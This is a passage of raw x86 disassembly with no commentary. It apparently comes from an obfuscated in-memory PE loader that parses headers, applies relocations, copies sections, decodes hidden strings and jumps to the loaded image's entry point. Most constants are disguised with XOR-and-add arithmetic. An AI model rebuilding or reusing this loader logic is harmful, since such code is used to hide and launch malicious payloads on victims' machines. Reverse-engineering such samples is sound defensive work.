  425dda:	mov    DWORD PTR [ebp+0xc],eax
  425ddd:	mov    eax,DWORD PTR [ebp-0x4]
  425de0:	mov    ecx,DWORD PTR [ebp-0x14]
  425de3:	xor    eax,esi
  425de5:	add    eax,edi
  425de7:	cmp    eax,ecx
  425de9:	je     0x425e14
  425deb:	mov    eax,DWORD PTR [ebp-0x4]
  425dee:	mov    ecx,DWORD PTR [ebp-0x14]
  425df1:	xor    eax,esi
  425df3:	add    eax,edi
  425df5:	shr    ecx,0x1f
  425df8:	cmp    eax,ecx
  425dfa:	je     0x425e14
  425dfc:	mov    ecx,DWORD PTR [ebp-0x14]
  425dff:	mov    eax,DWORD PTR [ebp+0x10]
  425e02:	mov    eax,DWORD PTR [eax+0x1e0]
  425e08:	movzx  ecx,cx
  425e0b:	push   ecx
  425e0c:	push   DWORD PTR [ebp-0xc]
  425e0f:	call   DWORD PTR [eax+0x8]
  425e12:	jmp    0x425e2d
  425e14:	mov    eax,DWORD PTR [ebp+0xc]
  425e17:	add    eax,DWORD PTR [ebp+0x8]
  425e1a:	mov    ecx,DWORD PTR [ebp+0x10]
  425e1d:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425e23:	add    eax,0x2
  425e26:	push   eax
  425e27:	push   DWORD PTR [ebp-0xc]
  425e2a:	call   DWORD PTR [ecx+0x8]
  425e2d:	mov    DWORD PTR [ebp+0xc],eax
  425e30:	mov    eax,DWORD PTR [ebp-0x4]
  425e33:	mov    ecx,DWORD PTR [ebp+0xc]
  425e36:	xor    eax,esi
  425e38:	add    eax,edi
  425e3a:	cmp    eax,ecx
  425e3c:	mov    eax,DWORD PTR [ebp-0x8]
  425e3f:	jne    0x425e52
  425e41:	mov    ecx,DWORD PTR [ebp-0x18]
  425e44:	xor    eax,esi
  425e46:	lea    eax,[ecx+eax*1+0x3272f6]
  425e4d:	mov    DWORD PTR [ebp-0x18],eax
  425e50:	jmp    0x425e62
  425e52:	mov    ecx,DWORD PTR [ebp+0xc]
  425e55:	xor    eax,esi
  425e57:	add    eax,edi
  425e59:	imul   eax,ecx
  425e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e5f:	mov    DWORD PTR [ecx+ebx*4],eax
  425e62:	mov    eax,DWORD PTR [ebp-0x8]
  425e65:	xor    eax,esi
  425e67:	lea    ebx,[ebx+eax*1+0x3272f6]
  425e6e:	mov    eax,DWORD PTR [ebp-0x4]
  425e71:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e74:	xor    eax,esi
  425e76:	add    eax,edi
  425e78:	cmp    DWORD PTR [ecx+ebx*4],eax
  425e7b:	jne    0x425dac
  425e81:	mov    edx,DWORD PTR [ebp-0x10]
  425e84:	mov    eax,DWORD PTR [ebp-0x18]
  425e87:	mov    ecx,DWORD PTR [ebp-0x2c]
  425e8a:	sub    edx,0x3272f5
  425e90:	xor    edx,esi
  425e92:	jmp    0x425c5c
  425e97:	mov    ecx,DWORD PTR [ebp-0x4]
  425e9a:	xor    ecx,esi
  425e9c:	add    ecx,edi
  425e9e:	cmp    eax,ecx
  425ea0:	mov    eax,DWORD PTR [ebp-0x4]
  425ea3:	jne    0x425ead
  425ea5:	mov    eax,DWORD PTR [ebp-0x8]
  425ea8:	jmp    0x425ead
  425eaa:	mov    eax,DWORD PTR [ebp-0x4]
  425ead:	xor    eax,esi
  425eaf:	add    eax,edi
  425eb1:	pop    edi
  425eb2:	pop    esi
  425eb3:	pop    ebx
  425eb4:	leave  
  425eb5:	ret    0xc
  425eb8:	push   ebp
  425eb9:	mov    ebp,esp
  425ebb:	sub    esp,0x28
  425ebe:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  425ec5:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  425ecc:	mov    eax,DWORD PTR [ebp+0xc]
  425ecf:	mov    DWORD PTR [ebp+0xc],eax
  425ed2:	push   esi
  425ed3:	mov    eax,eax
  425ed5:	mov    eax,DWORD PTR [ebp-0x4]
  425ed8:	mov    esi,DWORD PTR [ebp+0x8]
  425edb:	mov    ecx,0x75108af
  425ee0:	xor    eax,ecx
  425ee2:	mov    edx,0x3272f6
  425ee7:	add    eax,edx
  425ee9:	cmp    esi,eax
  425eeb:	je     0x426012
  425ef1:	mov    eax,DWORD PTR [ebp+0x8]
  425ef4:	mov    esi,DWORD PTR [ebp+0x8]
  425ef7:	add    esi,DWORD PTR [eax+0x3c]
  425efa:	push   edi
  425efb:	mov    DWORD PTR [ebp+0xc],esi
  425efe:	mov    DWORD PTR [ebp-0x1c],0xf89c85a0
  425f05:	mov    eax,DWORD PTR [ebp-0x1c]
  425f08:	mov    esi,DWORD PTR [ebp-0x4]
  425f0b:	mov    edi,DWORD PTR [ebp+0xc]
  425f0e:	xor    esi,ecx
  425f10:	xor    eax,ecx
  425f12:	add    esi,edx
  425f14:	cmp    DWORD PTR [edi+eax*8+0x1939828],esi
  425f1b:	je     0x42600c
  425f21:	mov    esi,DWORD PTR [ebp+0xc]
  425f24:	mov    eax,DWORD PTR [ebp+0x8]
  425f27:	add    eax,DWORD PTR [esi+0xa0]
  425f2d:	mov    esi,DWORD PTR [ebp+0x8]
  425f30:	mov    edi,DWORD PTR [ebp+0xc]
  425f33:	sub    esi,DWORD PTR [edi+0x34]
  425f36:	mov    edi,DWORD PTR [ebp-0x4]
  425f39:	xor    edi,ecx
  425f3b:	add    edi,edx
  425f3d:	mov    DWORD PTR [ebp-0x24],esi
  425f40:	cmp    esi,edi
  425f42:	je     0x42600c
  425f48:	mov    esi,DWORD PTR [ebp-0x4]
  425f4b:	xor    esi,ecx
  425f4d:	add    esi,edx
  425f4f:	mov    DWORD PTR [ebp-0x8],esi
  425f52:	push   ebx
  425f53:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  425f5a:	jmp    0x425ff6
  425f5f:	mov    esi,DWORD PTR [ebp-0x4]
  425f62:	xor    esi,ecx
  425f64:	lea    edi,[ebx-0x8]
  425f67:	add    esi,edx
  425f69:	shr    edi,1
  425f6b:	cmp    esi,edi
  425f6d:	jae    0x425fdc
  425f6f:	sub    edi,esi
  425f71:	lea    ebx,[eax+esi*2+0x8]
  425f75:	mov    DWORD PTR [ebp-0x18],edi
  425f78:	movzx  esi,WORD PTR [ebx]
  425f7b:	and    esi,0xfff
  425f81:	mov    DWORD PTR [ebp-0x14],esi
  425f84:	mov    edi,DWORD PTR [ebp-0x14]
  425f87:	mov    esi,DWORD PTR [eax]
  425f89:	sub    esi,edx
  425f8b:	add    edi,esi
  425f8d:	movzx  esi,WORD PTR [ebx]
  425f90:	shr    esi,0xc
  425f93:	xor    edi,ecx
  425f95:	mov    DWORD PTR [ebp-0x20],edi
  425f98:	mov    DWORD PTR [ebp-0x14],esi
  425f9b:	mov    esi,DWORD PTR [ebp-0x20]
  425f9e:	mov    edi,DWORD PTR [ebp+0x8]
  425fa1:	xor    esi,ecx
  425fa3:	lea    esi,[esi+edi*1+0x3272f6]
  425faa:	mov    DWORD PTR [ebp-0x20],esi
  425fad:	mov    esi,DWORD PTR [ebp-0x10]
  425fb0:	mov    edi,DWORD PTR [ebp-0x14]
  425fb3:	xor    esi,ecx
  425fb5:	add    esi,edx
  425fb7:	cmp    edi,esi
  425fb9:	jne    0x425fd1
  425fbb:	mov    esi,DWORD PTR [ebp-0x10]
  425fbe:	mov    edi,DWORD PTR [ebp-0x14]
  425fc1:	xor    esi,ecx
  425fc3:	add    esi,edx
  425fc5:	cmp    edi,esi
  425fc7:	jne    0x425fd1
  425fc9:	mov    esi,DWORD PTR [ebp-0x20]
  425fcc:	mov    edi,DWORD PTR [ebp-0x24]
  425fcf:	add    DWORD PTR [esi],edi
  425fd1:	add    ebx,0x2
  425fd4:	dec    DWORD PTR [ebp-0x18]
  425fd7:	jne    0x425f78
  425fd9:	mov    ebx,DWORD PTR [ebp-0xc]
  425fdc:	add    DWORD PTR [ebp-0x8],ebx
  425fdf:	mov    esi,DWORD PTR [ebp-0x1c]
  425fe2:	mov    edi,DWORD PTR [ebp-0x8]
  425fe5:	mov    ebx,DWORD PTR [ebp+0xc]
  425fe8:	xor    esi,ecx
  425fea:	cmp    edi,DWORD PTR [ebx+esi*8+0x193982c]
  425ff1:	jae    0x42600b
  425ff3:	add    eax,DWORD PTR [ebp-0xc]
  425ff6:	mov    esi,DWORD PTR [ebp-0x4]
  425ff9:	mov    ebx,DWORD PTR [eax+0x4]
  425ffc:	xor    esi,ecx
  425ffe:	add    esi,edx
  426000:	mov    DWORD PTR [ebp-0xc],ebx
  426003:	cmp    ebx,esi
  426005:	jne    0x425f5f
  42600b:	pop    ebx
  42600c:	mov    eax,DWORD PTR [ebp-0x28]
  42600f:	pop    edi
  426010:	jmp    0x426015
  426012:	mov    eax,DWORD PTR [ebp-0x4]
  426015:	xor    eax,ecx
  426017:	add    eax,edx
  426019:	pop    esi
  42601a:	leave  
  42601b:	ret    0x8
  42601e:	push   ebp
  42601f:	mov    ebp,esp
  426021:	sub    esp,0xd8
  426027:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42602e:	mov    DWORD PTR [ebp-0x24],0xf89c85a4
  426035:	mov    eax,DWORD PTR [ebp-0x4]
  426038:	push   ebx
  426039:	push   esi
  42603a:	mov    esi,0x75108af
  42603f:	xor    eax,esi
  426041:	push   edi
  426042:	mov    edi,0x3272f6
  426047:	add    eax,edi
  426049:	mov    DWORD PTR [ebp-0x18],eax
  42604c:	mov    eax,DWORD PTR [ebp-0x4]
  42604f:	xor    eax,esi
  426051:	add    eax,edi
  426053:	mov    DWORD PTR [ebp-0x8],eax
  426056:	mov    ebx,DWORD PTR [ebp+0x20]
  426059:	mov    eax,DWORD PTR [ebp-0x1c]
  42605c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42605f:	xor    eax,ecx
  426061:	mov    DWORD PTR [ebp-0x1c],eax
  426064:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  42606b:	mov    eax,DWORD PTR [ebp-0xc]
  42606e:	mov    ecx,DWORD PTR [ebp-0xc]
  426071:	xor    eax,ecx
  426073:	mov    DWORD PTR [ebp-0xc],eax
  426076:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  42607d:	mov    eax,DWORD PTR [ebp-0x10]
  426080:	mov    ecx,DWORD PTR [ebp-0x10]
  426083:	xor    eax,ecx
  426085:	mov    DWORD PTR [ebp-0x10],eax
  426088:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  42608f:	mov    eax,DWORD PTR [ebp-0x28]
  426092:	mov    ecx,DWORD PTR [ebp-0x28]
  426095:	xor    eax,ecx
  426097:	mov    DWORD PTR [ebp-0x28],eax
  42609a:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4260a1:	mov    DWORD PTR [ebp+0x20],0xf89ceff8
  4260a8:	mov    eax,DWORD PTR [ebp+0x8]
  4260ab:	test   eax,eax
  4260ad:	je     0x426534
  4260b3:	mov    eax,DWORD PTR [ebp+0xc]
  4260b6:	test   eax,eax
  4260b8:	je     0x426534
  4260be:	mov    eax,DWORD PTR [ebp+0x18]
  4260c1:	test   eax,eax
  4260c3:	je     0x426534
  4260c9:	mov    eax,DWORD PTR [ebp+0x20]
  4260cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4260cf:	xor    eax,0x8af
  4260d4:	add    eax,0x72f6
  4260d9:	cmp    WORD PTR [ecx],ax
  4260dc:	jne    0x426534
  4260e2:	mov    eax,DWORD PTR [ebp-0x4]
  4260e5:	xor    eax,esi
  4260e7:	add    eax,edi
  4260e9:	mov    DWORD PTR [ebp-0x30],eax
  4260ec:	mov    eax,DWORD PTR [ebp-0x4]
  4260ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4260f2:	mov    eax,DWORD PTR [ebp+0x8]
  4260f5:	add    eax,DWORD PTR [ecx+0x3c]
  4260f8:	mov    DWORD PTR [ebp+0xc],eax
  4260fb:	mov    eax,DWORD PTR [eax+0x50]
  4260fe:	test   eax,eax
  426100:	je     0x426534
  426106:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  42610d:	mov    eax,DWORD PTR [ebp-0x2c]
  426110:	xor    eax,esi
  426112:	add    eax,edi
  426114:	mov    DWORD PTR [ebp-0x2c],eax
  426117:	mov    eax,DWORD PTR [ebp-0x4]
  42611a:	mov    eax,DWORD PTR [ebx+0x190]
  426120:	mov    ecx,DWORD PTR [eax]
  426122:	mov    ecx,DWORD PTR [ecx+0x3c]
  426125:	add    ecx,DWORD PTR [eax]
  426127:	mov    eax,DWORD PTR [ebp-0x4]
  42612a:	mov    eax,DWORD PTR [ebx+0x18c]
  426130:	mov    edx,DWORD PTR [eax]
  426132:	mov    DWORD PTR [ebp-0x20],ecx
  426135:	mov    DWORD PTR [ebp+0x20],edx
  426138:	cmp    edx,edx
  42613a:	jne    0x42616e
  42613c:	mov    eax,DWORD PTR [ebx+0x1e0]
  426142:	lea    edx,[ebp-0x18]
  426145:	push   edx
  426146:	mov    edx,DWORD PTR [ebp-0xc]
  426149:	xor    edx,esi
  42614b:	add    edx,edi
  42614d:	push   edx
  42614e:	push   DWORD PTR [ecx+0x50]
  426151:	push   DWORD PTR [ebp+0x20]
  426154:	call   DWORD PTR [eax+0x1c]
  426157:	mov    eax,DWORD PTR [ebp-0x20]
  42615a:	mov    ecx,DWORD PTR [eax+0x54]
  42615d:	mov    eax,DWORD PTR [eax+0x50]
  426160:	sub    eax,ecx
  426162:	add    ecx,DWORD PTR [ebp+0x20]
  426165:	push   ecx
  426166:	call   0x426ad1
  42616b:	mov    edx,DWORD PTR [ebp+0x20]
  42616e:	mov    eax,DWORD PTR [ebx+0x194]
  426174:	mov    DWORD PTR [eax],edx
  426176:	mov    eax,DWORD PTR [ebp+0xc]
  426179:	push   DWORD PTR [eax+0x54]
  42617c:	push   DWORD PTR [ebp+0x8]
  42617f:	push   edx
  426180:	call   0x4269c7
  426185:	mov    ecx,DWORD PTR [ebp+0x20]
  426188:	mov    eax,DWORD PTR [ecx+0x3c]
  42618b:	add    eax,ecx
  42618d:	movzx  ecx,WORD PTR [eax+0x14]
  426191:	lea    ecx,[ecx+eax*1+0x18]
  426195:	mov    DWORD PTR [ebp+0x18],ecx
  426198:	mov    ecx,DWORD PTR [ebp-0x4]
  42619b:	movzx  edx,WORD PTR [eax+0x6]
  42619f:	xor    ecx,esi
  4261a1:	add    ecx,edi
  4261a3:	mov    DWORD PTR [ebp+0xc],eax
  4261a6:	cmp    edx,ecx
  4261a8:	je     0x426255
  4261ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4261b1:	xor    ecx,esi
  4261b3:	add    ecx,edi
  4261b5:	mov    DWORD PTR [ebp-0x8],ecx
  4261b8:	mov    ecx,DWORD PTR [ebp-0x24]
  4261bb:	movzx  edx,WORD PTR [eax+0x6]
  4261bf:	xor    ecx,esi
  4261c1:	sub    edx,ecx
  4261c3:	sub    edx,edi
  4261c5:	cmp    DWORD PTR [ebp-0x8],edx
  4261c8:	ja     0x426255
  4261ce:	mov    edx,DWORD PTR [ebp+0x18]
  4261d1:	add    edx,0x8
  4261d4:	mov    DWORD PTR [ebp+0x18],edx
  4261d7:	jmp    0x4261dc
  4261d9:	mov    edx,DWORD PTR [ebp+0x18]
  4261dc:	mov    eax,DWORD PTR [eax+0x38]
  4261df:	lea    ecx,[eax-0x1]
  4261e2:	mov    DWORD PTR [ebp-0x38],eax
  4261e5:	mov    eax,DWORD PTR [edx]
  4261e7:	test   eax,ecx
  4261e9:	je     0x4261f2
  4261eb:	not    ecx
  4261ed:	and    eax,ecx
  4261ef:	add    eax,DWORD PTR [ebp-0x38]
  4261f2:	mov    ecx,DWORD PTR [edx+0x4]
  4261f5:	add    ecx,DWORD PTR [ebp+0x20]
  4261f8:	push   ecx
  4261f9:	call   0x426ad1
  4261fe:	mov    edx,DWORD PTR [ebp-0x4]
  426201:	mov    eax,DWORD PTR [ebp+0x18]
  426204:	mov    ecx,DWORD PTR [eax+0x8]
  426207:	xor    edx,esi
  426209:	add    edx,edi
  42620b:	cmp    ecx,edx
  42620d:	je     0x426226
  42620f:	push   ecx
  426210:	mov    ecx,DWORD PTR [ebp+0x8]
  426213:	add    ecx,DWORD PTR [eax+0xc]
  426216:	mov    eax,DWORD PTR [eax+0x4]
  426219:	add    eax,DWORD PTR [ebp+0x20]
  42621c:	push   ecx
  42621d:	push   eax
  42621e:	call   0x4269c7
  426223:	mov    eax,DWORD PTR [ebp+0x18]
  426226:	mov    ecx,DWORD PTR [ebp-0x24]
  426229:	mov    edx,DWORD PTR [ebp-0x8]
  42622c:	add    eax,0x28
  42622f:	xor    ecx,esi
  426231:	lea    ecx,[edx+ecx*1+0x3272f6]
  426238:	mov    edx,DWORD PTR [ebp+0xc]
  42623b:	mov    DWORD PTR [ebp+0x18],eax
  42623e:	mov    eax,DWORD PTR [ebp-0x24]
  426241:	movzx  edx,WORD PTR [edx+0x6]
  426245:	xor    eax,esi
  426247:	sub    edx,eax
  426249:	mov    eax,DWORD PTR [ebp+0xc]
  42624c:	sub    edx,edi
  42624e:	mov    DWORD PTR [ebp-0x8],ecx
  426251:	cmp    ecx,edx
  426253:	jbe    0x4261d9
  426255:	mov    edx,DWORD PTR [ebx+0x18c]
  42625b:	mov    ecx,DWORD PTR [ebp+0x20]
  42625e:	cmp    ecx,DWORD PTR [edx]
  426260:	jne    0x426289
  426262:	mov    eax,DWORD PTR [ebx+0x1e0]
  426268:	lea    edx,[ebp-0x18]
  42626b:	push   edx
  42626c:	mov    edx,DWORD PTR [ebp-0x10]
  42626f:	xor    edx,esi
  426271:	add    edx,edi
  426273:	push   edx
  426274:	mov    edx,DWORD PTR [ebp-0x20]
  426277:	push   DWORD PTR [edx+0x54]
  42627a:	push   ecx
  42627b:	call   DWORD PTR [eax+0x1c]
  42627e:	test   eax,eax
  426280:	je     0x426525
  426286:	mov    eax,DWORD PTR [ebp+0xc]
  426289:	mov    ecx,DWORD PTR [ebx+0x1c8]
  42628f:	mov    ecx,DWORD PTR [ecx]
  426291:	xor    ecx,esi
  426293:	add    ecx,edi
  426295:	je     0x426450
  42629b:	mov    eax,DWORD PTR [ebp-0x4]
  42629e:	xor    eax,esi
  4262a0:	add    eax,edi
  4262a2:	and    DWORD PTR [ebp+0x8],0x0
  4262a6:	mov    DWORD PTR [ebp-0x14],eax
  4262a9:	mov    eax,0xf89c85c1
  4262ae:	lea    ecx,[eax+0x18]
  4262b1:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4262b8:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  4262bf:	mov    DWORD PTR [ebp-0x50],eax
  4262c2:	mov    DWORD PTR [ebp-0x4c],ecx
  4262c5:	mov    DWORD PTR [ebp-0x48],ecx
  4262c8:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  4262cf:	mov    edx,DWORD PTR [ebp+0x8]
  4262d2:	mov    ecx,0x8af
  4262d7:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4262dc:	mov    edx,0x72f6
  4262e1:	add    cx,dx
  4262e4:	mov    edx,DWORD PTR [ebp+0x8]
  4262e7:	inc    DWORD PTR [ebp+0x8]
  4262ea:	cmp    DWORD PTR [ebp+0x8],0x6
  4262ee:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  4262f6:	jb     0x4262cf
  4262f8:	mov    ecx,0xf89c85d3
  4262fd:	mov    DWORD PTR [ebp-0xb0],eax
  426303:	mov    DWORD PTR [ebp-0x9c],eax
  426309:	mov    DWORD PTR [ebp-0x74],eax
  42630c:	mov    DWORD PTR [ebp-0x70],eax
  42630f:	lea    eax,[ecx-0x1]
  426312:	lea    edx,[ecx+0x2c]
  426315:	mov    DWORD PTR [ebp-0x64],eax
  426318:	mov    DWORD PTR [ebp-0x60],eax
  42631b:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  426325:	mov    DWORD PTR [ebp-0xac],ecx
  42632b:	mov    DWORD PTR [ebp-0xa8],edx
  426331:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  42633b:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  426345:	mov    DWORD PTR [ebp-0x98],0xf89c85e0
  42634f:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  426359:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  426363:	mov    DWORD PTR [ebp-0x8c],ecx
  426369:	mov    DWORD PTR [ebp-0x88],0xf89c852c
  426373:	mov    DWORD PTR [ebp-0x84],edx
  426379:	mov    DWORD PTR [ebp-0x80],0xf89c85d6
  426380:	mov    DWORD PTR [ebp-0x7c],ecx
  426383:	mov    DWORD PTR [ebp-0x78],0xf89c85e4
  42638a:	mov    DWORD PTR [ebp-0x6c],ecx
  42638d:	mov    DWORD PTR [ebp-0x68],0xf89c85c0
  426394:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  42639b:	xor    eax,eax
  42639d:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4263a4:	xor    cl,0xaf
  4263a7:	sub    cl,0xa
  4263aa:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4263b1:	inc    eax
  4263b2:	cmp    eax,0x17
  4263b5:	jb     0x42639d
  4263b7:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263bd:	lea    ecx,[ebp-0xc0]
  4263c3:	push   ecx
  4263c4:	call   DWORD PTR [eax+0x4]
  4263c7:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4263cd:	lea    edx,[ebp-0xd8]
  4263d3:	push   edx
  4263d4:	push   eax
  4263d5:	call   DWORD PTR [ecx+0x8]
  4263d8:	mov    DWORD PTR [ebp-0x40],eax
  4263db:	lea    eax,[ebp-0x14]
  4263de:	push   eax
  4263df:	mov    eax,DWORD PTR [ebx+0x18c]
  4263e5:	push   DWORD PTR [eax]
  4263e7:	mov    eax,DWORD PTR [ebp-0x40]
  4263ea:	call   eax
  4263ec:	mov    eax,DWORD PTR [ebp-0x4]
  4263ef:	xor    eax,esi
  4263f1:	add    eax,edi
  4263f3:	mov    DWORD PTR [ebp-0x34],eax
  4263f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4263f9:	mov    eax,DWORD PTR [ebp-0x14]
  4263fc:	xor    ecx,esi
  4263fe:	add    ecx,edi
  426400:	cmp    eax,ecx
  426402:	je     0x42644d
  426404:	mov    DWORD PTR [ebp-0x3c],eax
  426407:	jmp    0x426418
  426409:	mov    eax,DWORD PTR [eax]
  42640b:	mov    ecx,DWORD PTR [ebp-0x3c]
  42640e:	mov    DWORD PTR [ebp-0x14],eax
  426411:	mov    eax,DWORD PTR [ebp-0x14]
  426414:	cmp    eax,ecx
  426416:	je     0x426425
  426418:	mov    edx,DWORD PTR [eax+0x18]
  42641b:	mov    ecx,DWORD PTR [ebx+0x18c]
  426421:	cmp    edx,DWORD PTR [ecx]
  426423:	jne    0x426409
  426425:	mov    ecx,DWORD PTR [ebx+0x18c]
  42642b:	mov    edx,DWORD PTR [eax+0x18]
  42642e:	cmp    edx,DWORD PTR [ecx]
  426430:	jne    0x42644d
  426432:	mov    ecx,DWORD PTR [ebx+0x190]
  426438:	mov    edx,DWORD PTR [ebp-0x20]
  42643b:	mov    edx,DWORD PTR [edx+0x28]
  42643e:	add    edx,DWORD PTR [ecx]
  426440:	mov    DWORD PTR [eax+0x1c],edx
  426443:	mov    eax,DWORD PTR [ebp-0x24]
  426446:	xor    eax,esi
  426448:	add    eax,edi
  42644a:	mov    DWORD PTR [ebp-0x34],eax
  42644d:	mov    eax,DWORD PTR [ebp+0xc]
  426450:	push   ebx
  426451:	push   eax
  426452:	push   DWORD PTR [ebp+0x20]
  426455:	call   0x425bd5
  42645a:	test   eax,eax
  42645c:	je     0x426525
  426462:	push   DWORD PTR [ebp+0xc]
  426465:	mov    ecx,ebx
  426467:	push   DWORD PTR [ebp+0x20]
  42646a:	call   0x425b2e
  42646f:	test   eax,eax
  426471:	je     0x426525
  426477:	mov    eax,DWORD PTR [ebp+0xc]
  42647a:	mov    edx,DWORD PTR [ebp+0x20]
  42647d:	mov    ecx,ebx
  42647f:	call   0x425a07
  426484:	test   eax,eax
  426486:	je     0x426525
  42648c:	push   ebx
  42648d:	push   DWORD PTR [ebp+0x20]
  426490:	call   0x425eb8
  426495:	test   eax,eax
  426497:	je     0x426525
  42649d:	mov    eax,DWORD PTR [ebx+0x18c]
  4264a3:	mov    edx,DWORD PTR [ebp+0x20]
  4264a6:	cmp    edx,DWORD PTR [eax]
  4264a8:	jne    0x4264c4
  4264aa:	mov    eax,DWORD PTR [ebx+0x1e0]
  4264b0:	lea    ecx,[ebp-0x18]
  4264b3:	push   ecx
  4264b4:	push   DWORD PTR [ebp-0x18]
  4264b7:	mov    ecx,DWORD PTR [ebp-0x20]
  4264ba:	push   DWORD PTR [ecx+0x54]
  4264bd:	push   edx
  4264be:	call   DWORD PTR [eax+0x1c]
  4264c1:	mov    edx,DWORD PTR [ebp+0x20]
  4264c4:	mov    eax,DWORD PTR [ebx+0x1c8]
  4264ca:	mov    eax,DWORD PTR [eax]
  4264cc:	xor    eax,esi
  4264ce:	add    eax,edi
  4264d0:	je     0x426509
  4264d2:	mov    ecx,DWORD PTR [ebp+0xc]
  4264d5:	mov    eax,DWORD PTR [ecx+0x28]
  4264d8:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  4264df:	mov    esi,DWORD PTR [ebp+0x8]
  4264e2:	push   DWORD PTR [ebp+0x14]
  4264e5:	xor    esi,0x8af
  4264eb:	push   DWORD PTR [ebp+0x10]
  4264ee:	add    esi,0x72f6
  4264f4:	or     WORD PTR [ecx+0x16],si
  4264f8:	add    eax,edx
  4264fa:	push   edx
  4264fb:	call   eax
  4264fd:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a4
  426507:	jmp    0x426513
  426509:	mov    eax,DWORD PTR [ebp+0xc]
  42650c:	mov    eax,DWORD PTR [eax+0x28]
  42650f:	add    eax,edx
  426511:	call   eax
  426513:	mov    DWORD PTR [ebp-0x8],eax
  426516:	mov    eax,DWORD PTR [ebp-0x8]
  426519:	mov    ecx,DWORD PTR [ebp+0x1c]
  42651c:	mov    DWORD PTR [ecx],eax
  42651e:	mov    DWORD PTR [ebp-0x30],0x1
  426525:	cmp    DWORD PTR [ebp-0x30],0x0
  426529:	jne    0x42652f
  42652b:	and    DWORD PTR [ebp+0x20],0x0
  42652f:	mov    eax,DWORD PTR [ebp+0x20]
  426532:	jmp    0x426536
  426534:	xor    eax,eax
  426536:	pop    edi
  426537:	pop    esi
  426538:	pop    ebx
  426539:	leave  
  42653a:	ret    0x1c
  42653d:	push   ebp
  42653e:	mov    ebp,esp
  426540:	movzx  edx,WORD PTR [ecx+0x6]
  426544:	movzx  eax,WORD PTR [ecx+0x14]
  426548:	push   ebx
  426549:	push   edi
  42654a:	xor    edi,edi
  42654c:	lea    eax,[eax+ecx*1+0x18]
  426550:	test   edx,edx
  426552:	je     0x426573
  426554:	mov    ecx,DWORD PTR [eax+0xc]
  426557:	lea    ebx,[ecx+esi*1]
  42655a:	cmp    DWORD PTR [ebp+0x8],ebx
  42655d:	jb     0x42656b
  42655f:	mov    ebx,DWORD PTR [eax+0x8]
  426562:	add    ebx,ecx
  426564:	add    ebx,esi
  426566:	cmp    DWORD PTR [ebp+0x8],ebx
  426569:	jb     0x426575
  42656b:	add    eax,0x28
  42656e:	inc    edi
  42656f:	cmp    edi,edx
  426571:	jb     0x426554
  426573:	xor    eax,eax
  426575:	pop    edi
  426576:	pop    ebx
  426577:	pop    ebp
  426578:	ret    0x4
  42657b:	push   ebp
  42657c:	mov    ebp,esp
  42657e:	sub    esp,0x34
  426581:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426588:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42658f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  426596:	mov    DWORD PTR [ebp-0x8],0xf89c85c4
  42659d:	mov    DWORD PTR [ebp-0x20],0xf89c85e4
  4265a4:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  4265ab:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  4265b2:	mov    DWORD PTR [ebp-0x10],eax
  4265b5:	mov    eax,DWORD PTR [ebp+0x8]
  4265b8:	mov    DWORD PTR [ebp-0x14],eax
  4265bb:	mov    eax,DWORD PTR [ebp-0xc]
  4265be:	push   ebx
  4265bf:	mov    ecx,0x75108af
  4265c4:	xor    eax,ecx
  4265c6:	push   esi
  4265c7:	mov    esi,DWORD PTR [ebp-0x10]
  4265ca:	mov    edx,0x3272f6
  4265cf:	add    eax,edx
  4265d1:	push   edi
  4265d2:	cmp    esi,eax
  4265d4:	je     0x4267b3
  4265da:	mov    eax,DWORD PTR [ebp-0xc]
  4265dd:	mov    esi,DWORD PTR [ebp-0x14]
  4265e0:	xor    eax,ecx
  4265e2:	add    eax,edx
  4265e4:	cmp    esi,eax
  4265e6:	je     0x4267b3
  4265ec:	mov    eax,DWORD PTR [ebp-0xc]
  4265ef:	xor    eax,ecx
  4265f1:	add    eax,edx
  4265f3:	mov    DWORD PTR [ebp-0x24],eax
  4265f6:	mov    eax,DWORD PTR [ebp-0xc]
  4265f9:	xor    eax,ecx
  4265fb:	add    eax,edx
  4265fd:	mov    DWORD PTR [ebp-0x28],eax
  426600:	mov    edi,DWORD PTR [ebp-0x20]
  426603:	mov    ebx,DWORD PTR [ebp-0x8]
  426606:	mov    esi,0x8af
  42660b:	xor    edi,esi
  42660d:	mov    eax,0x72f6
  426612:	xor    ebx,esi
  426614:	add    edi,eax
  426616:	add    ebx,eax
  426618:	sub    ebx,edi
  42661a:	mov    WORD PTR [ebp-0x8],bx
  42661e:	jmp    0x4266e3
  426623:	mov    edi,DWORD PTR [ebp-0xc]
